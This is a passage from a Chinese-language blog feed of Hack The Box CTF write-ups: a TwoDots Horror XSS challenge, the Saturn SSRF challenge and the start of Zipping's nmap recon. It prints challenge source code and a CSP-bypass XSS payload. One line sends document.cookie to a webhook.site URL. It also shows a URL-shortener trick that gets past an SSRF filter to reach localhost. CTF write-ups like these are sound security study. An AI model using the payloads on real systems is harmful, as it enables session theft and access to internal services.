&#x27;networkidle2&#x27;</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait browser.close();</span><br><span class=\"line\">\tawait db.migrate();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = &#123; purgeData &#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这里存在了 flag 放进了 cookies</p>\n<p>routes/index.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs             = require(&#x27;fs&#x27;);</span><br><span class=\"line\">const bot            = require(&#x27;../bot&#x27;);</span><br><span class=\"line\">const path           = require(&#x27;path&#x27;);</span><br><span class=\"line\">const express        = require(&#x27;express&#x27;);</span><br><span class=\"line\">const router         = express.Router();</span><br><span class=\"line\">const JWTHelper      = require(&#x27;../helpers/JWTHelper&#x27;);</span><br><span class=\"line\">const UploadHelper   = require(&#x27;../helpers/UploadHelper&#x27;)</span><br><span class=\"line\">const AuthMiddleware = require(&#x27;../middleware/AuthMiddleware&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">let db;</span><br><span class=\"line\"></span><br><span class=\"line\">const response = data =&gt; (&#123; message: data &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn res.render(&#x27;index.html&#x27;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/register&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\tconst &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (username &amp;&amp; password) &#123;</span><br><span class=\"line\">\t\treturn db.checkUser(username)</span><br><span class=\"line\">\t\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\t\tif (user) return res.status(401).send(response(&#x27;User already registered!&#x27;));</span><br><span class=\"line\">\t\t\t\treturn db.registerUser(username, password)</span><br><span class=\"line\">\t\t\t\t\t.then(()  =&gt; res.send(response(&#x27;User registered successfully!&#x27;)))</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.catch(() =&gt; res.send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn res.status(401).send(response(&#x27;Please fill out all the required fields!&#x27;));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/login&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\tconst &#123; username, password &#125; = req.body;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (username &amp;&amp; password) &#123;</span><br><span class=\"line\">\t\treturn db.loginUser(username, password)</span><br><span class=\"line\">\t\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\t\tlet token = JWTHelper.sign(&#123; username: user.username &#125;);</span><br><span class=\"line\">\t\t\t\tres.cookie(&#x27;session&#x27;, token, &#123; maxAge: 3600000 &#125;);</span><br><span class=\"line\">\t\t\t\treturn res.send(response(&#x27;User authenticated successfully!&#x27;));</span><br><span class=\"line\">\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t.catch(() =&gt; res.status(403).send(response(&#x27;Invalid username or password!&#x27;)));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn res.status(500).send(response(&#x27;Missing parameters!&#x27;));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/feed&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif(user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\treturn db.getPosts()</span><br><span class=\"line\">\t\t\t\t.then(feed =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\tres.render(&#x27;feed.html&#x27;, &#123; feed &#125;);</span><br><span class=\"line\">\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/profile&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif(user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\tres.render(&#x27;profile.html&#x27;, &#123; user &#125;);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/review&#x27;, async (req, res, next) =&gt; &#123;</span><br><span class=\"line\">\tif(req.ip != &#x27;127.0.0.1&#x27;) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn db.getPosts(0)</span><br><span class=\"line\">\t\t.then(feed =&gt; &#123;</span><br><span class=\"line\">\t\t\tres.render(&#x27;review.html&#x27;, &#123; feed &#125;);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/submit&#x27;, AuthMiddleware, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.redirect(&#x27;/&#x27;); </span><br><span class=\"line\">\t\t\tconst &#123; content &#125; = req.body;</span><br><span class=\"line\">\t\t\tif(content)&#123;</span><br><span class=\"line\">\t\t\t\ttwoDots = content.match(/\\./g);</span><br><span class=\"line\">\t\t\t\tif(twoDots == null || twoDots.length != 2)&#123;</span><br><span class=\"line\">\t\t\t\t\treturn res.status(403).send(response(&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;));</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\treturn db.addPost(user.username, content)</span><br><span class=\"line\">\t\t\t\t\t.then(() =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\t\tbot.purgeData(db);</span><br><span class=\"line\">\t\t\t\t\t\tres.send(response(&#x27;Your submission is awaiting approval by Admin!&#x27;));</span><br><span class=\"line\">\t\t\t\t\t&#125;);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\treturn res.status(403).send(response(&#x27;Please write your story first!&#x27;));</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/upload&#x27;, AuthMiddleware, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\tif (!req.files) return res.status(400).send(response(&#x27;No files were uploaded.&#x27;));</span><br><span class=\"line\">\t\t\treturn UploadHelper.uploadImage(req.files.avatarFile)</span><br><span class=\"line\">\t\t\t\t.then(filename =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\treturn db.updateAvatar(user.username,filename)</span><br><span class=\"line\">\t\t\t\t\t\t.then(()  =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\tres.send(response(&#x27;Image uploaded successfully!&#x27;));</span><br><span class=\"line\">\t\t\t\t\t\t\tif(user.avatar != &#x27;default.jpg&#x27;) </span><br><span class=\"line\">\t\t\t\t\t\t\t\tfs.unlinkSync(path.join(__dirname, &#x27;/../uploads&#x27;,user.avatar)); // remove old avatar</span><br><span class=\"line\">\t\t\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(err =&gt; res.status(500).send(response(err.message)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/api/avatar/:username&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.params.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.status(404).send(response(&#x27;user does not exist!&#x27;));</span><br><span class=\"line\">\t\t\tavatar = path.join(__dirname, &#x27;/../uploads&#x27;, user.avatar);</span><br><span class=\"line\">\t\t\treturn res.sendFile(avatar);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/logout&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\tres.clearCookie(&#x27;session&#x27;);</span><br><span class=\"line\">\treturn res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = database =&gt; &#123; </span><br><span class=\"line\">\tdb = database;</span><br><span class=\"line\">\treturn router;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这个是记录路由的地方</p>\n<p>并且上面还引用了我们需要的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const bot            = require(&#x27;../bot&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>在代码 93 行调用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bot.purgeData(db);</span><br></pre></td></tr></table></figure></p>\n<p>现在我们就是要利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.get(&#x27;/api/avatar/:username&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.params.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return </span><br></pre></td></tr></table></figure></p>\n<p>加上前端代码的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">                        &lt;p&gt;&#123;&#123; post.content|safe &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p>来达到获取 cookie 但是因为这个 blog 利用了 csp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: &quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(twoDots == null || twoDots.length != 2)&#123;</span><br><span class=\"line\">\treturn res.status(403).send(response(&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>要求你必须要写两个段落也就是两个点</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;/api/avatar/test&quot;&gt;&lt;/script&gt;1.1.</span><br></pre></td></tr></table></figure></p>\n<p>写成这样就可以了</p>\n<p>在利用 upload 来上传我们需要的 payload</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs</span><br></pre></td></tr></table></figure></p>\n<p>这里接收 cookie 的用的是 webhook</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/=document.location.href=&quot;https://webhook.site/72ad2f9e-7a81-4b01-d3ed-8290387f7d0b?&quot;+document.cookie;/*</span><br></pre></td></tr></table></figure></p>\n<p>内容加进图片并且要不小于 120x120</p>\n<p>这里我使用的软件是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">img_polygloter.py</span><br></pre></td></tr></table></figure></p>\n<p>然后不知道为什么我就得不到 cookie</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Saturn/",
            "url": "https://lookhui.github.io/HTB-Saturn/",
            "title": "HTB-Saturn",
            "date_published": "2023-12-15T09:04:13.000Z",
            "content_html": "<h1 id=\"saturn\"><a class=\"anchor\" href=\"#saturn\">#</a> Saturn</h1>\n<p>白盒测试</p>\n<p>首先进入网站下载题目</p>\n<p>查看到了源码使用 python 进行搭建</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, render_template</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from safeurl import safeurl</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">        url = request.form[&#x27;url&#x27;]</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            su = safeurl.SafeURL()</span><br><span class=\"line\">            opt = safeurl.Options()</span><br><span class=\"line\">            opt.enableFollowLocation().setFollowLocationLimit(0)</span><br><span class=\"line\">            su.setOptions(opt)</span><br><span class=\"line\">            su.execute(url)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return render_template(&#x27;index.html&#x27;, error=f&quot;Malicious input detected.&quot;)</span><br><span class=\"line\">        r = requests.get(url)</span><br><span class=\"line\">        return render_template(&#x27;index.html&#x27;, result=r.text)</span><br><span class=\"line\">    return render_template(&#x27;index.html&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/secret&#x27;)</span><br><span class=\"line\">def secret():</span><br><span class=\"line\">    if request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">        flag = &quot;&quot;</span><br><span class=\"line\">        with open(&#x27;./flag.txt&#x27;) as f:</span><br><span class=\"line\">            flag = f.readline()</span><br><span class=\"line\">        return render_template(&#x27;secret.html&#x27;, SECRET=flag)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return render_template(&#x27;forbidden.html&#x27;), 403</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    app.run(host=&quot;0.0.0.0&quot;, port=1337, threaded=True)</span><br></pre></td></tr></table></figure></p>\n<p>一开始我看这个题目觉得很离谱，一直在传参发现没有作用</p>\n<p>先来解释一遍这个代码的过程吧</p>\n<ol>\n<li>\n<p>调用了这三个包，真的非常的强大的几个包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, render_template</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from safeurl import safeurl</span><br></pre></td></tr></table></figure></p>\n<p>了解一下这个包，他是用来效验你的 url 是否为他想要的那几个</p>\n<p>源码过滤如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self._lists = &#123;</span><br><span class=\"line\">        &quot;whitelist&quot;: &#123;</span><br><span class=\"line\">            &quot;ip&quot;: [],</span><br><span class=\"line\">            &quot;port&quot;: [&quot;80&quot;, &quot;443&quot;, &quot;8080&quot;],</span><br><span class=\"line\">            &quot;domain&quot;: [],</span><br><span class=\"line\">            &quot;scheme&quot;: [&quot;http&quot;, &quot;https&quot;]&#125;,</span><br><span class=\"line\">        &quot;blacklist&quot;: &#123;</span><br><span class=\"line\">            &quot;ip&quot;: [&quot;0.0.0.0/8&quot;, &quot;10.0.0.0/8&quot;, &quot;100.64.0.0/10&quot;, &quot;127.0.0.0/8&quot;, &quot;169.254.0.0/16&quot;,</span><br><span class=\"line\">                &quot;172.16.0.0/12&quot;, &quot;192.0.0.0/29&quot;, &quot;192.0.2.0/24&quot;, &quot;192.88.99.0/24&quot;, &quot;192.168.0.0/16&quot;,</span><br><span class=\"line\">                &quot;198.18.0.0/15&quot;, &quot;198.51.100.0/24&quot;, &quot;203.0.113.0/24&quot;, &quot;224.0.0.0/4&quot;, &quot;240.0.0.0/4&quot;],</span><br><span class=\"line\">            &quot;port&quot;: [],</span><br><span class=\"line\">            &quot;domain&quot;: [],</span><br><span class=\"line\">            &quot;scheme&quot;: []&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>然后就是一个函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">        url = request.form[&#x27;url&#x27;]</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            su = safeurl.SafeURL()</span><br><span class=\"line\">            opt = safeurl.Options()</span><br><span class=\"line\">            opt.enableFollowLocation().setFollowLocationLimit(0)</span><br><span class=\"line\">            su.setOptions(opt)</span><br><span class=\"line\">            su.execute(url)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return render_template(&#x27;index.html&#x27;, error=f&quot;Malicious input detected.&quot;)</span><br><span class=\"line\">        r = requests.get(url)</span><br><span class=\"line\">        return render_template(&#x27;index.html&#x27;, result=r.text)</span><br><span class=\"line\">    return render_template(&#x27;index.html&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这个函数就是让你输入一个 url 并且必须要你的 url 不是本地 url 使用了上面说的 safeurl 进行了效验</p>\n</li>\n<li>\n<p>第三段</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/secret&#x27;)</span><br><span class=\"line\">def secret():</span><br><span class=\"line\">    if request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">        flag = &quot;&quot;</span><br><span class=\"line\">        with open(&#x27;./flag.txt&#x27;) as f:</span><br><span class=\"line\">            flag = f.readline()</span><br><span class=\"line\">        return render_template(&#x27;secret.html&#x27;, SECRET=flag)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return render_template(&#x27;forbidden.html&#x27;), 403</span><br></pre></td></tr></table></figure></p>\n<p>这个代码只要你的 requests.remote_addr 是 127.0.0.1 就能得到 flag</p>\n<p>但是这个 remote_addr 和 xff 那种不太一样不好进行伪造</p>\n</li>\n<li>\n<p>总结</p>\n<p>我们现在可以通过第一个路由 index 来去访问这个 secret 来构成伪造，要么就自己伪造这个 127.0.0.1</p>\n<p>我经过了很久搜索发现这个伪造没有我想的这么简单</p>\n<p>并且在其他网站上还有说这个 remote_addr 根本不可能伪造</p>\n</li>\n</ol>\n<h4 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h4>\n<p>经过多次搜索在不屑的努力下，搜到了一个网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.shorturl.at/shortener.php</span><br></pre></td></tr></table></figure></p>\n<p>这个网站可以将你的 url 缩短并且使用他的 url 和使用自己的效果一样</p>\n<p>把</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:1337/secret</span><br></pre></td></tr></table></figure></p>\n<p>输入进入后能发现变成了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://shorturl.at/abENS</span><br></pre></td></tr></table></figure></p>\n<p>然后输入到 index 的框里面</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Zipping/",
            "url": "https://lookhui.github.io/HTB-Zipping/",
            "title": "HTB-Zipping",
            "date_published": "2023-12-15T03:29:22.000Z",
            "content_html": "<h1 id=\"zipping\"><a class=\"anchor\" href=\"#zipping\">#</a> Zipping</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>开启靶机后得到靶机 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">靶机:10.129.48.105</span><br><span class=\"line\">自己:10.10.14.22</span><br></pre></td></tr></table></figure></p>\n<p>首先使用 nmap 来进行扫描</p>\n<p>同时使用浏览器默认访问</p>\n<p>发现和常规的不同不需要使用域名也就是不需要更换 hosts</p>\n<p>使用 f12 打开检查点击 network 查看响应器 (目的是查看是否有可利用的 api)</p>\n<p>发现并没有我们想要的</p>\n<p>使用 wfuzz 进行模糊测试查看目录</p>\n<p>同时 nmap 扫描信息出来</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 11:31 中国标准时间</span><br><span class=\"line\">Nmap scan report for bogon (10.129.48.105)</span><br><span class=\"line\">Host is up (0.32s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.04 